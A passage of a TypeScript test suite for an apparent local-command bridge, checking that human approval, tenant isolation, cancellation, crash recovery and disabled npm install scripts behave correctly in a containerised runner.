          const view = await localServiceUserAction(
            f.context,
            f.run,
            processId,
            'status',
            undefined,
            database,
          );
          return !!view?.ready && view.requests.length === 1;
        });
        const ready = await localServiceUserAction(
          f.context,
          f.run,
          processId,
          'status',
          undefined,
          database,
        );
        expect(ready?.visibility).toBe('container_only');
        expect(
          (await f.ledger().readOperation(f.task.scope, processId)).processId,
        ).toBe(processId);
        const request = ready!.requests[0]!.request as {
          requestId: string;
          sequence: number;
          expiresAt: string;
        };
        const input = {
          requestId: request.requestId,
          sequence: request.sequence,
          expiresAt: request.expiresAt,
          inputId: randomUUID(),
          kind: 'text' as const,
          text: 'synthetic-value\n',
          digest: digest({ kind: 'text', text: 'synthetic-value\n' }),
        };
        await localServiceUserAction(
          f.context,
          f.run,
          processId,
          'input',
          input,
          database,
        );
        await until(
          async () =>
            !!(
              await localServiceUserAction(
                f.context,
                f.run,
                processId,
                'status',
                undefined,
                database,
              )
            )?.requests[0]?.delivered,
        );
        const requested = await localServiceUserAction(
          f.context,
          f.run,
          processId,
          'stop',
          undefined,
          database,
        );
        expect(requested?.state).toBe('stopping');
        await until(async () => {
          await bridge.flush();
          return (
            (await f.ledger().readOperation(f.task.scope, processId)).status ===
            'canceled'
          );
        });
        const [view] = await listLocalCommandOperations(
          f.context,
          f.run,
          database,
        );
        const result = RuntimeLocalCommandResultSchema.parse(
          (view!.evidence as { output: unknown }).output,
        );
        expect(result.stopped).toBe(true);
        expect(result.stdout).toContain('accepted-count:1');
        expect(result.stdout).not.toContain('accepted-count:2');
        expect(view!.service?.state).toBe('stopped');
        expect(await readFile(join(project, 'service.mjs'), 'utf8')).toBe(
          source,
        );
      } finally {
        await stopLocalProcesses(journal);
        await journal.close();
        await new Promise<void>((resolve) => server.close(() => resolve()));
      }
    },
    60000,
  );
  it('P09-c scopes bounded human input, handles input before readiness and never calls pipe delivery application consumption', async () => {
    const f = await serviceFixture();
    const request = {
      requestId: randomUUID(),
      sequence: 0,
      prompt: 'Provide a short value',
      expiresAt: new Date(Date.now() + 8000).toISOString(),
      maxBytes: 100,
    };
    await f.exchange([
      { ...f.event, type: 'input_request', sequence: 1, request },
    ]);
    await f.exchange([
      {
        ...f.event,
        type: 'ready',
        sequence: 2,
        port: 3100,
        visibility: 'container_only',
      },
    ]);
    const input = {
      inputId: randomUUID(),
      requestId: request.requestId,
      sequence: 0,
      expiresAt: request.expiresAt,
      kind: 'text' as const,
      text: 'user-private-input',
      digest: digest({ kind: 'text', text: 'user-private-input' }),
    };
    await expect(
      localServiceUserAction(
        { ...f.context, actor: { type: 'user', id: randomUUID() } },
        f.run,
        f.base.operationId,
        'input',
        input,
        database,
      ),
    ).rejects.toThrow();
    await expect(
      localServiceUserAction(
        f.context,
        randomUUID(),
        f.base.operationId,
        'input',
        input,
        database,
      ),
    ).rejects.toThrow();
    await expect(
      localServiceUserAction(
        f.context,
        f.run,
        f.base.operationId,
        'input',
        { ...input, digest: digest('wrong') },
        database,
      ),
    ).rejects.toThrow();
    const saved = await localServiceUserAction(
      f.context,
      f.run,
      f.base.operationId,
      'input',
      input,
      database,
    );
    expect(JSON.stringify(saved)).not.toContain(input.text);
    await localServiceUserAction(
      f.context,
      f.run,
      f.base.operationId,
      'input',
      input,
      database,
    );
    await expect(
      localServiceUserAction(
        f.context,
        f.run,
        f.base.operationId,
        'input',
        { ...input, inputId: randomUUID() },
        database,
      ),
    ).rejects.toThrow();
    expect((await f.exchange()).inputs).toEqual([input]);
    expect((await f.exchange()).inputs).toEqual([input]);
    const delivered = {
      ...f.event,
      type: 'input_delivered' as const,
      sequence: 3,
      inputId: input.inputId,
      requestId: input.requestId,
      inputSequence: input.sequence,
      digest: input.digest,
      kind: input.kind,
    };
    expect((await f.exchange([delivered])).inputs).toEqual([]);
    expect((await f.exchange([delivered])).acceptedSequence).toBe(3);
    const view = await localServiceUserAction(
      f.context,
      f.run,
      f.base.operationId,
      'status',
      undefined,
      database,
    );
    expect(view?.requests[0]?.delivered).toBe(true);
    expect(JSON.stringify(view)).not.toContain(input.text);
  });
  it.each(['run_end', 'cancel', 'expiry'] as const)(
    'P09-c %s requests stop without extending its deadline or claiming process termination',
    async (mode) => {
      const f = await serviceFixture();
      const request = {
        requestId: randomUUID(),
        sequence: 0,
        prompt: 'Short input',
        expiresAt: new Date(Date.now() + 8000).toISOString(),
        maxBytes: 100,
      };
      await f.exchange([
        { ...f.event, type: 'input_request', sequence: 1, request },
      ]);
      if (mode === 'run_end')
        await database`update allrice_runs set state='succeeded' where id=${f.run}`;
      else if (mode === 'cancel')
        await f.ledger().cancelRoot(f.task.scope, f.run, randomUUID());
      else
        await database`update allrice_local_services set hard_deadline_at=clock_timestamp()-interval '1 second' where operation_id=${f.base.operationId}`;
      await expect(
        localServiceUserAction(
          f.context,
          f.run,
          f.base.operationId,
          'input',
          {
            inputId: randomUUID(),
            requestId: request.requestId,
            sequence: 0,
            expiresAt: request.expiresAt,
            kind: 'text',
            text: 'late',
            digest: digest({ kind: 'text', text: 'late' }),
          },
          database,
        ),
      ).rejects.toThrow();
      const stopped = await f.exchange();
      expect(stopped.stopRequested).toBe(true);
      expect(stopped.inputs).toEqual([]);
      expect(['running', 'cancel_requested']).toContain(
        stopped.snapshot.status,
      );
      expect(Date.parse(stopped.hardDeadlineAt)).toBeLessThanOrEqual(
        Date.parse(f.initialized.hardDeadlineAt),
      );
    },
  );
  it('P09-b keeps install source and script policy under exact approval, old-client exclusion and frozen outbound capability', async () => {
    for (const network of [false, true]) {
      const f = await commandFixture(undefined, undefined, network);
      const p = dependencyFixture().pkg;
      const args = {
        ...f.args,
        dependencies: {
          manager: 'npm',
          strategy: 'locked_ci',
          registry: 'https://registry.npmjs.org',
          scripts: 'disabled',
          packages: [
            { name: p.name, version: p.version, integrity: p.integrity },
          ],
        },
      };
      await expect(f.create('install', args)).rejects.toThrow(
        'local_runner_upgrade_required',
      );
      await database`update allrice_bridge_runtime_profiles set profile=jsonb_set(profile,'{features}','["npm_dependencies"]'::jsonb) where device_id=${f.device.id}`;
      if (!network) {
        await expect(f.create('install', args)).rejects.toThrow();
        continue;
      }
      const op = await f.create('install', args);
      expect(op.snapshot.status).toBe('waiting_user');
      const claim = () =>
        f.ledger().claimNextBridgeOperation({
          scope: f.task.scope,
          deviceId: f.device.id,
          leaseMs: 30000,
          supportsLocalCommand: true,
          supportsNpmDependencies: true,
        });
      expect(await claim()).toBeNull();
      await f.approve();
      expect(await f.claim()).toBeNull();
      await expect(
        f.create('install', {
          ...args,
          dependencies: {
            ...args.dependencies,
            scripts: 'allow_in_isolated_copy',
          },
        }),
      ).rejects.toThrow('idempotency_conflict');
      expect((await claim())?.bridgePayload).toMatchObject({
        arguments: { dependencies: { scripts: 'disabled' } },
      });
    }
  });
  it('P09-b rejecting install leaves no claimable operation, even for a capable Bridge', async () => {
    const f = await commandFixture();
    await database`update allrice_bridge_runtime_profiles set profile=jsonb_set(profile,'{features}','["npm_dependencies"]'::jsonb) where device_id=${f.device.id}`;
    const p = dependencyFixture().pkg;
    await f.create('rejected-install', {
      ...f.args,
      dependencies: {
        manager: 'npm',
        strategy: 'locked_ci',
        registry: 'https://registry.npmjs.org',
        scripts: 'disabled',
        packages: [p],
      },
    });
    await f.approve('rejected');
    expect(
      await f.ledger().claimNextBridgeOperation({
        scope: f.task.scope,
        deviceId: f.device.id,
        leaseMs: 30000,
        supportsLocalCommand: true,
        supportsNpmDependencies: true,
      }),
    ).toBeNull();
  });
  it('P05 rejects same-call mutations, expired profiles, unverified platforms and frozen tool removal', async () => {
    const f = await commandFixture();
    await f.create();
    await expect(
      f.create('p05-call', { ...f.args, args: ['other.mjs'] }),
    ).rejects.toThrow('idempotency_conflict');
    await f.approve();
    await database`update allrice_bridge_runtime_profiles set reported_at=clock_timestamp()-interval '91 seconds' where device_id=${f.device.id}`;
    expect(await f.claim()).toBeNull();
    await database`update allrice_bridge_runtime_profiles set reported_at=clock_timestamp() where device_id=${f.device.id}`;
    await expect(
      reportLocalCommandProfile(
        { ...f.device, platform: 'macos-arm64' },
        {
          contractVersion: 1,
          backend: 'local-vm-container-v1',
          imageDigest: f.imageDigest,
          architecture: 'arm64',
          available: true,
        },
        database,
      ),
    ).rejects.toThrow('target_unavailable');
    const without = await commandFixture([]);
    await expect(without.create('new-call')).rejects.toThrow();
  });
  it('P05 isolates browser reads and cancel intent by owner, tenant and membership', async () => {
    const f = await commandFixture();
    await f.create();
    expect(
      await listLocalCommandOperations(f.context, f.run, database),
    ).toHaveLength(1);
    for (const context of [
      { ...f.context, actor: { type: 'user' as const, id: randomUUID() } },
      { ...f.context, organizationId: randomUUID() },
      { ...f.context, workspaceId: randomUUID() },
    ]) {
      await expect(
        listLocalCommandOperations(context, f.run, database),
      ).rejects.toThrow('operation_not_found');
      await expect(
        cancelLocalCommandRun(context, f.run, database),
      ).rejects.toThrow('operation_not_found');
    }
    await database`update allrice_memberships set active=false where id=${f.membership}`;
    await expect(
      listLocalCommandOperations(f.context, f.run, database),
    ).rejects.toThrow('operation_not_found');
  });
  it.each(['cancel', 'lease_expired'])(
    'P05 rechecks the live Worker job on %s, including during device heartbeat',
    async (change) => {
      const f = await commandFixture();
      await expect(
        createLocalCommandOperation(
          {
            context: {
              ...f.execution,
              worker: { type: 'worker', id: randomUUID() },
            },
            arguments: f.args,
            callId: 'foreign-worker',
          },
          database,
        ),
      ).rejects.toThrow('run_or_frozen_configuration_changed');
      await f.create();
      await f.approve();
      const claim = (await f.claim())!,
        attempt = claim.snapshot.binding.attempt,
        ledger = f.ledger();
      const lease = {
        scope: f.task.scope,
        operationId: attempt.operationId,
        leaseToken: claim.leaseToken,
      };
      await ledger.startOperation({
        ...lease,
        attempt,
        receiptId: randomUUID(),
      });
      if (change === 'cancel')
        await database`update allrice_jobs set cancel_requested_at=clock_timestamp() where id=${f.execution.jobId}`;
      else
        await database`update allrice_jobs set lease_expires_at=clock_timestamp()-interval '1 second' where id=${f.execution.jobId}`;
      await expect(
        ledger.heartbeat({ ...lease, leaseMs: 30000 }),
      ).rejects.toThrow();
      await expect(f.create('later-call')).rejects.toThrow(
        'run_or_frozen_configuration_changed',
      );
    },
  );
  it('P05 bounds ordered output, deduplicates exactly, and stops permission renewal on cancellation', async () => {
    const f = await commandFixture();
    await f.create();
    await f.approve();
    const claim = (await f.claim())!,
      attempt = claim.snapshot.binding.attempt;
    const ledger = f.ledger(),
      lease = {
        scope: f.task.scope,
        operationId: attempt.operationId,
        leaseToken: claim.leaseToken,
      };
    await ledger.startOperation({ ...lease, attempt, receiptId: randomUUID() });
    await ledger.heartbeat({ ...lease, leaseMs: 30000 });
    const chunk = {
      ...lease,
      attempt,
      sequence: 0,
      stream: 'stdout' as const,
      content: 'one',
    };
    await ledger.recordOutput(chunk);
    await ledger.recordOutput(chunk);
    await expect(
      ledger.recordOutput({ ...chunk, content: 'different' }),
    ).rejects.toThrow('receipt_conflict');
    await expect(
      ledger.recordOutput({ ...chunk, sequence: 2 }),
    ).rejects.toThrow();
    const [view] = await listLocalCommandOperations(f.context, f.run, database);
    expect(view?.output).toEqual([
      { sequence: 0, stream: 'stdout', content: 'one' },
    ]);
    const cancel = await cancelLocalCommandRun(f.context, f.run, database);
    expect(cancel.operations[0]?.status).toBe('cancel_requested');
    await expect(
      ledger.heartbeat({ ...lease, leaseMs: 30000 }),
    ).rejects.toThrow();
  });
  it('P05 rejects feature-off execution without touching the operation ledger', async () => {
    const f = await commandFixture();
    vi.stubEnv('ALLRICE_LOCAL_COMMAND_ENABLED', '0');
    await expect(f.create()).rejects.toThrow('runtime_policy_disabled');
    expect(
      await listLocalCommandOperations(f.context, f.run, database),
    ).toEqual([]);
  });
  it('P05 rejection before dispatch is confirmed not-executed, not a forever-stopping process', async () => {
    const f = await commandFixture();
    await f.create();
    await f.approve('rejected');
    expect(await f.claim()).toBeNull();
    const canceled = await cancelLocalCommandRun(f.context, f.run, database);
    expect(canceled.operations[0]?.status).toBe('canceled');
    const [view] = await listLocalCommandOperations(f.context, f.run, database);
    expect(view?.evidence).toMatchObject({ output: { notExecuted: true } });
  });
  it.skipIf(!process.env.ALLRICE_LOCAL_DOCKER_TEST_SOCKET)(
    'P05 real Chrome → approval DB → HTTP Bridge → local VM → durable receipt; lost ACK never repeats execution',
    async () => {
      const f = await commandFixture();
      const temporary = await realpath(
          await mkdtemp(join(tmpdir(), 'allrice-p05-e2e-')),
        ),
        root = join(temporary, 'workspace');
      await mkdir(root);
      const source =
        'console.log("P05 browser fixture");console.error("separate stderr");setTimeout(()=>process.exit(0),1500);';
      await writeFile(join(root, 'test.mjs'), source);
      const fingerprint = createHash('sha256').update(root).digest('hex');
      await database`update allrice_bridge_folder_grants set root_fingerprint=${fingerprint} where id=${f.grant}`;
      const created = await f.create('p05-browser', {
        ...f.args,
        files: [
          {
            path: 'test.mjs',
            sha256: `sha256:${createHash('sha256').update(source).digest('hex')}`,
          },
        ],
      });
      const require = createRequire(resolve('apps/worker/package.json'));
      const { chromium } = require('playwright-core') as typeof Playwright;
      const build = createRequire(require.resolve('tsx/package.json'))(
        'esbuild',
      ).build;
      const assets = await build({
        entryPoints: [resolve('apps/web/test/local-command-page.tsx')],
        bundle: true,
        write: false,
        outdir: temporary,
        platform: 'browser',
        format: 'iife',
        jsx: 'automatic',
        define: { 'process.env.NODE_ENV': '"production"' },
      });
      const js = assets.outputFiles.find((file: { path: string }) =>
        file.path.endsWith('.js'),
      ).text;
      const css = assets.outputFiles.find((file: { path: string }) =>
        file.path.endsWith('.css'),
      ).text;
      const deviceHandler = createRuntimeBridgeHttpHandler({
        enabled: () => true,
        authenticate: async (token) => {
          if (token !== 'synthetic-p05-device-token')
            throw Object.assign(Error('unauthorized'), {
              code: 'device_unauthorized',
            });
          return {
            device: f.device,
            grants: [
              {
                id: f.grant,
                deviceId: f.device.id,
                label: 'P05 fixture',
                rootFingerprint: fingerprint,
                createdAt: new Date().toISOString(),
                revokedAt: null,
              },
            ],
          };
        },
        ledgerForDevice: async () => f.ledger(),
      });
      let lostAck = false;
      const server = createServer((req, res) => {
        void (async () => {
          const chunks: Buffer[] = [];
          for await (const chunk of req) chunks.push(Buffer.from(chunk));
          const body = Buffer.concat(chunks),
            path = new URL(req.url ?? '/', 'http://localhost').pathname;
          if (path === '/') {
            res.setHeader('content-type', 'text/html');
            res.end(
              `<!doctype html><meta name="viewport" content="width=device-width"><style>body{font:14px system-ui;margin:12px}*{box-sizing:border-box}${css}</style><div id="root"></div><script id="p05-input" type="application/json">${JSON.stringify({ runId: f.run, workspaceId: f.context.workspaceId, tenantHeaders: { 'x-p05-browser': 'synthetic' }, runActive: false })}</script><script src="/fixture.js"></script>`,
            );
            return;
          }
          if (path === '/fixture.js') {
            res.setHeader('content-type', 'application/javascript');
            res.end(js);
            return;
          }
          if (path.startsWith('/api/v1/bridge/device/operations/')) {
            const action = path.split('/').at(-1)! as
              'next' | 'start' | 'receipts' | 'heartbeat' | 'output';
            const result = await deviceHandler(
              new Request(`http://localhost${path}`, {
                method: 'POST',
                headers: {
                  authorization: String(req.headers.authorization ?? ''),
                  'content-type': 'application/json',
                },
                ...(body.length ? { body } : {}),
              }),
              action,
              path.split('/').at(-2),
            );
            if (action === 'receipts' && !lostAck && result.ok) {
              lostAck = true;
              res.destroy();
              return;
            }
            res.statusCode = result.status;
            res.setHeader('content-type', 'application/json');
            res.end(await result.text());
            return;
          }
          // Synthetic browser identity only. Production cookie auth has separate route tests.
          if (req.headers['x-p05-browser'] !== 'synthetic') {
            res.statusCode = 401;
            res.end();
            return;
          }
          res.setHeader('content-type', 'application/json');
          if (path === '/api/v1/runtime/local-commands') {
            res.end(
              JSON.stringify({
                operations: await listLocalCommandOperations(
                  f.context,
                  f.run,
                  database,
                ),
              }),
            );
            return;
          }
          if (path.startsWith('/api/v1/runtime/approvals/')) {
            res.end(
              JSON.stringify({
                approval: await decideRuntimeActionApproval(
                  f.context,
                  path.split('/').at(-1)!,
                  JSON.parse(body.toString()),
                  database,
                ),
              }),
            );
            return;
          }
          res.statusCode = 404;
          res.end();
        })().catch(() => {
          res.statusCode = 500;
          res.end('fixture request failed');
        });
      });
      server.listen(0, '127.0.0.1');
      await once(server, 'listening');
      const address = server.address();
      if (!address || typeof address === 'string')
        throw Error('fixture listener');
      const origin = `http://127.0.0.1:${address.port}`;
      const journal = await BridgeJournal.open({
        directory: join(temporary, 'journal'),
        server: origin,
        deviceId: f.device.id,
      });
      const runner = new LocalCommandRunner({
        socketPath: process.env.ALLRICE_LOCAL_DOCKER_TEST_SOCKET!,
        imageDigest: f.imageDigest,
      });
      const client = new RuntimeBridgeOperationClient({
        config: {
          server: origin,
          deviceId: f.device.id,
          deviceName: 'fixture',
          grants: [
            {
              id: f.grant,
              label: 'fixture',
              rootPath: root,
              rootFingerprint: fingerprint,
            },
          ],
        },
        token: 'synthetic-p05-device-token',
        journal,
        runner,
      });
      const browser = await chromium.launch({
        headless: true,
        executablePath:
          '/Applications/Google Chrome.app/Contents/MacOS/Google Chrome',
      });
      let child: ReturnType<typeof spawn> | undefined,
        recoveredJournal: BridgeJournal | undefined;
      try {
        expect(await client.pollOnce()).toBe(false);
        const page = await browser.newPage({
            viewport: { width: 1200, height: 900 },
          }),
          pageErrors: string[] = [];
        page.on('pageerror', (error) => pageErrors.push(error.message));
        await page.goto(origin);
        await page
          .getByRole('button', { name: '批准这一次执行', exact: true })
          .click();
        await page
          .getByText('已批准这一次执行（不等于已完成）', { exact: false })
          .waitFor();
        await expect(client.pollOnce()).rejects.toThrow();
        expect(lostAck).toBe(true);
        expect(await journal.pending()).toHaveLength(1);
        const snapshot = await f
          .ledger()
          .readOperation(
            f.task.scope,
            created.snapshot.binding.attempt.operationId,
          );
        expect(snapshot.status).toBe('succeeded');
        await client.flush();
        expect(await client.pollOnce()).toBe(false);
        expect(await journal.pending()).toHaveLength(0);
        await page.getByText('命令执行成功', { exact: true }).waitFor();
        await page.reload();
        await page.getByText('命令执行成功', { exact: true }).waitFor();
        await page.getByText(/stdout \/ stderr/).click();
        expect(
          await page.getByLabel('stdout', { exact: true }).textContent(),
        ).toContain('P05 browser fixture');
        expect(
          await page.getByLabel('stderr', { exact: true }).textContent(),
        ).toContain('separate stderr');
        await page.setViewportSize({ width: 390, height: 844 });
        expect(
          await page.evaluate(
            () => document.documentElement.scrollWidth <= window.innerWidth,
          ),
        ).toBe(true);
        expect(pageErrors).toEqual([]);
        const [view] = await listLocalCommandOperations(
          f.context,
          f.run,
          database,
        );
        const parsed = RuntimeLocalCommandResultSchema.parse(
          (view!.evidence as { output: unknown }).output,
        );
        expect(parsed).toMatchObject({
          exitCode: 0,
          reason: 'exited',
          sourceDirectoryModified: false,
        });
        const [count] = await database<
          { n: number }[]
        >`select count(*)::int as n from allrice_runtime_operation_events where operation_id=${created.snapshot.binding.attempt.operationId} and payload->'signal'->>'type'='operation.started'`;
        expect(count?.n).toBe(1);

        // P09-a uses the SAME browser approval, HTTP queue and durable receipt.
        const manifest = JSON.stringify({
          packageManager: 'npm@10.9.8',
          dependencies: { fixture: '1.0.0' },
          scripts: { postinstall: 'touch must-not-run' },
        });
        await writeFile(join(root, 'package.json'), manifest);
        await writeFile(join(root, 'package-lock.json'), '{}');
        await database`update allrice_bridge_runtime_profiles set profile=jsonb_set(profile,'{features}','["project_diagnostics"]'::jsonb) where device_id=${f.device.id}`;
        const diagnostic = await f.create('p09a-browser', {
          ...f.args,
          args: [],
          diagnostics: { kind: 'node_project' },
          files: [
            {
              path: 'package.json',
              sha256: `sha256:${createHash('sha256').update(manifest).digest('hex')}`,
            },
            {
              path: 'package-lock.json',
              sha256: `sha256:${createHash('sha256').update('{}').digest('hex')}`,
            },
          ],
        });
        await page.reload();
        await page
          .getByRole('button', { name: '批准这一次执行', exact: true })
          .click();
        await vi.waitFor(async () => {
          const [row] = await database<
            { runtime_response: unknown }[]
          >`select runtime_response from allrice_approval_requests where resource_id=${diagnostic.snapshot.binding.attempt.operationId}`;
          expect(row?.runtime_response).toMatchObject({ decision: 'approved' });
        });
        expect(await client.pollOnce()).toBe(true);
        await page.getByLabel('项目环境诊断结果').waitFor();
        expect(
          await page.getByLabel('项目环境诊断结果').textContent(),
        ).toContain('隔离副本的依赖尚未准备');
        expect(
          await page.getByLabel('项目环境诊断结果').textContent(),
        ).toContain('v22.23.2');
        await page.reload();
        await page.getByLabel('项目环境诊断结果').waitFor();
        expect(
          await page.evaluate(
            () => document.documentElement.scrollWidth <= innerWidth,
          ),
        ).toBe(true);
        await expect(readFile(join(root, 'must-not-run'))).rejects.toThrow();
        expect(await readFile(join(root, 'package.json'), 'utf8')).toBe(
          manifest,
        );
        expect(pageErrors).toEqual([]);

        const dependency = dependencyFixture();
        for (const [path, bytes] of Object.entries(dependency.files))
          await writeFile(join(root, path), bytes);
        await database`update allrice_bridge_runtime_profiles set profile=jsonb_set(profile,'{features}','["project_diagnostics","npm_dependencies"]'::jsonb) where device_id=${f.device.id}`;
        const install = await f.create('p09b-browser', {
          ...f.args,
          args: ['verify.cjs'],
          limits: {
            ...f.args.limits,
            timeoutMs: 20000,
            memoryMiB: 256,
            cpuMillis: 1000,
            pids: 64,
          },
          dependencies: {
            manager: 'npm',
            strategy: 'locked_ci',
            registry: 'https://registry.npmjs.org',
            scripts: 'disabled',
            packages: [dependency.pkg],
          },
          files: Object.entries(dependency.files).map(([path, bytes]) => ({
            path,
            sha256: `sha256:${createHash('sha256').update(bytes).digest('hex')}`,
          })),
        });
        await page.reload();
        await page.getByLabel('依赖安装授权范围').waitFor();
        expect(
          await page.getByLabel('依赖安装授权范围').textContent(),
        ).toContain('禁止（--ignore-scripts）');
        await page
          .getByRole('button', { name: '批准这一次执行', exact: true })
          .click();
        await vi.waitFor(async () => {
          const [row] = await database<
            { runtime_response: unknown }[]
          >`select runtime_response from allrice_approval_requests where resource_id=${install.snapshot.binding.attempt.operationId}`;
          expect(row?.runtime_response).toMatchObject({ decision: 'approved' });
        });
        expect(await client.pollOnce()).toBe(true);
        await page
          .getByText('依赖准备：安装及指定验证命令成功', { exact: false })
          .waitFor();
        await page.reload();
        await page
          .getByText('依赖准备：安装及指定验证命令成功', { exact: false })
          .waitFor();
        const installedViews = await listLocalCommandOperations(
          f.context,
          f.run,
          database,
        );
        expect(
          installedViews.find(
            (v) =>
              v.snapshot.binding.attempt.operationId ===
              install.snapshot.binding.attempt.operationId,
          )?.evidence,
        ).toMatchObject({
          output: {
            stdout: expect.stringContaining('dependency verification: 42'),
            dependencies: { status: 'installed_and_verification_succeeded' },
          },
        });
        expect(
          await page.evaluate(
            () => document.documentElement.scrollWidth <= innerWidth,
          ),
        ).toBe(true);
        await expect(
          readFile(join(root, 'node_modules', dependency.pkg.name, 'index.js')),
        ).rejects.toThrow();

        const crashSource =
          'console.log("crash fixture started");setInterval(()=>{},100);';
        await writeFile(join(root, 'test.mjs'), crashSource);
        const crashed = await f.create('p05-crash', {
          ...f.args,
          limits: { ...f.args.limits, timeoutMs: 1800 },
          files: [
            {
              path: 'test.mjs',
              sha256: `sha256:${createHash('sha256').update(crashSource).digest('hex')}`,
            },
          ],
        });
        await page.reload();
        await page
          .getByRole('button', { name: '批准这一次执行', exact: true })
          .click();
        await vi.waitFor(async () => {
          const views = await listLocalCommandOperations(
            f.context,
            f.run,
            database,
          );
          expect(
            views.find(
              (v) =>
                v.snapshot.binding.attempt.operationId ===
                crashed.snapshot.binding.attempt.operationId,
            )?.approval?.response,
          ).toMatchObject({ decision: 'approved' });
        });
        const crashJournalPath = join(temporary, 'crash-journal');
        const childConfig = {
          server: origin,
          deviceId: f.device.id,
          deviceName: 'crash fixture',
          grants: [
            {
              id: f.grant,
              label: 'fixture',
              rootPath: root,
              rootFingerprint: fingerprint,
            },
          ],
        };
        const childScript = `
          import {BridgeJournal} from ${JSON.stringify(new URL('../../../apps/rice-bridge/src/journal.ts', import.meta.url).href)};
          import {RuntimeBridgeOperationClient} from ${JSON.stringify(new URL('../../../apps/rice-bridge/src/operation-client.ts', import.meta.url).href)};
          import {LocalCommandRunner} from ${JSON.stringify(new URL('../../../apps/rice-bridge/src/local-command-runner.ts', import.meta.url).href)};
          const config=${JSON.stringify(childConfig)};
          const journal=await BridgeJournal.open({directory:${JSON.stringify(crashJournalPath)},server:config.server,deviceId:config.deviceId});
          await new RuntimeBridgeOperationClient({config,token:'synthetic-p05-device-token',journal,runner:new LocalCommandRunner(${JSON.stringify(runner.config)})}).pollOnce();
          await journal.close();`;
        child = spawn(
          process.execPath,
          ['--import', 'tsx', '--input-type=module', '--eval', childScript],
          {
            cwd: resolve('.'),
            env: {
              PATH: process.env.PATH,
              TSX_TSCONFIG_PATH: resolve('tsconfig.base.json'),
            },
            stdio: ['ignore', 'ignore', 'pipe'],
          },
        );
        let childError = '';
        child.stderr?.on('data', (bytes) => {
          if (childError.length < 2000) childError += String(bytes);
        });
        await vi.waitFor(
          async () => {
            if (child?.exitCode !== null)
              throw Error(`Synthetic Bridge child exited: ${childError}`);
            const [output] = await database<
              { n: number }[]
            >`select count(*)::int as n from allrice_runtime_operation_output where operation_id=${crashed.snapshot.binding.attempt.operationId}`;
            expect(output?.n).toBeGreaterThan(0);
          },
          { timeout: 10000 },
        );
        const exited = once(child, 'exit');
        child.kill('SIGKILL');
        await exited;
        // The Bridge process is gone; observe the independent container deadline
        // BEFORE invoking recovery (which would itself stop a running orphan).
        await vi.waitFor(
          async () => {
            const state = await runner.api.json<{ State: { Status: string } }>(
              'GET',
              `/containers/allrice-${crashed.snapshot.binding.attempt.attemptId}/json`,
            );
            expect(state.State.Status).toBe('exited');
          },
          { timeout: 7000 },
        );
        recoveredJournal = await BridgeJournal.open({
          directory: crashJournalPath,
          server: origin,
          deviceId: f.device.id,
        });
        expect(await recoveredJournal.unknownLocalCommands()).toHaveLength(1);
        const recovering = new RuntimeBridgeOperationClient({
          config: childConfig,
          token: 'synthetic-p05-device-token',
          journal: recoveredJournal,
          runner,
        });
        expect(await recovering.pollOnce()).toBe(false);
        const views = await listLocalCommandOperations(
            f.context,
            f.run,
            database,
          ),
          recovered = views.find(
            (v) =>
              v.snapshot.binding.attempt.operationId ===
              crashed.snapshot.binding.attempt.operationId,
          )!;
        expect(recovered.snapshot.status).toBe('failed');
        expect(recovered.evidence).toMatchObject({
          output: {
            stopped: true,
            reason: 'timeout',
            sourceDirectoryModified: false,
          },
        });
        expect(await recoveredJournal.unknownLocalCommands()).toHaveLength(0);
      } finally {
        if (child && child.exitCode === null && child.signalCode === null) {
          const exited = once(child, 'exit');
          child.kill('SIGKILL');
          await exited;
        }
        await recoveredJournal?.close();
        await browser.close();
        await journal.close();
        server.closeAllConnections();
        await new Promise<void>((resolve) => server.close(() => resolve()));
        await rm(temporary, { recursive: true, force: true });
      }
    },
    60_000,
  );
  it('persists Ask; re-created production factory consumes exact approval atomically and starts once', async () => {
    const f = await fixture(),
      op = f.operation();
    expect((await op.factory().createOperation(op.input)).status).toBe(
      'waiting_user',
    );
    expect(await f.claim()).toBeNull();
    const req = await op.approve();
    expect(
      (await getRuntimeActionApproval(f.context, req.approvalId, database))
        .consumedAt,
    ).toBeNull();
    const claims = await Promise.all(
      Array.from({ length: 6 }, () => f.claim()),
    );
    const dispatched = claims.filter((item) => item !== null);
    expect(dispatched).toHaveLength(1);
    expect(
      (await getRuntimeActionApproval(f.context, req.approvalId, database))
        .consumedAt,
    ).not.toBeNull();
    const lease = dispatched[0]!;
    const start = {
      scope: f.task.scope,
      operationId: lease.snapshot.binding.attempt.operationId,
      attempt: lease.snapshot.binding.attempt,
      receiptId: randomUUID(),
      leaseToken: lease.leaseToken,
    };
    expect((await f.ledger().startOperation(start)).mayExecute).toBe(true);
    expect((await f.ledger().startOperation(start)).mayExecute).toBe(false);
  });
  it('skips a pending approval without blocking a later approved operation', async () => {
    const f = await fixture(),
      waiting = f.operation(),
      ready = f.operation();
    await waiting.factory().createOperation(waiting.input);
    await ready.factory().createOperation(ready.input);
    await ready.approve();
    expect((await f.claim())?.snapshot.binding.attempt.operationId).toBe(
      ready.input.snapshot.binding.attempt.operationId,
    );
    expect(
      (
        await f
          .ledger()
          .readOperation(
            f.task.scope,
            waiting.input.snapshot.binding.attempt.operationId,
          )
      ).status,
    ).toBe('waiting_user');
  });
  it('rotates more than 20 waiting candidates with a bounded next poll', async () => {
    const f = await fixture();
    for (let n = 0; n < 21; n++) {
      const op = f.operation();
      await op.factory().createOperation(op.input);
    }
    const ready = f.operation();
    await ready.factory().createOperation(ready.input);
    await ready.approve();
    expect(await f.claim()).toBeNull();
    expect((await f.claim())?.snapshot.binding.attempt.operationId).toBe(
      ready.input.snapshot.binding.attempt.operationId,
    );
  });
  it('does not convert missing policy or SQL errors into an empty queue', async () => {
    const f = await fixture('allow'),
      op = f.operation();
    await op.factory().createOperation(op.input);
    await database`delete from allrice_runtime_policy_controls where organization_id=${f.context.organizationId}`;
    await expect(f.claim()).rejects.toThrow(
      'runtime_policy_missing_or_invalid',
    );
  });
  it.each([
    'device',
    'grant',
    'capability',
    'target_metadata',
    'target_key',
    'target_capability',
    'heartbeat',
    'membership',
    'run',
    'policy',
  ])(
    'rechecks %s after approval; revoked or changed authority cannot dispatch',
    async (change) => {
      const f = await fixture(),
        op = f.operation();
      await op.factory().createOperation(op.input);
      const req = await op.approve();
      if (change === 'device')
        await database`update allrice_bridge_devices set revoked_at=clock_timestamp() where id=${f.device.id}`;
      if (change === 'grant')
        await database`update allrice_bridge_folder_grants set revoked_at=clock_timestamp() where id=${f.grant}`;
      if (change === 'capability')
        await database`update allrice_bridge_devices set capabilities=array['local.fs.list'] where id=${f.device.id}`;
      if (change === 'target_metadata')
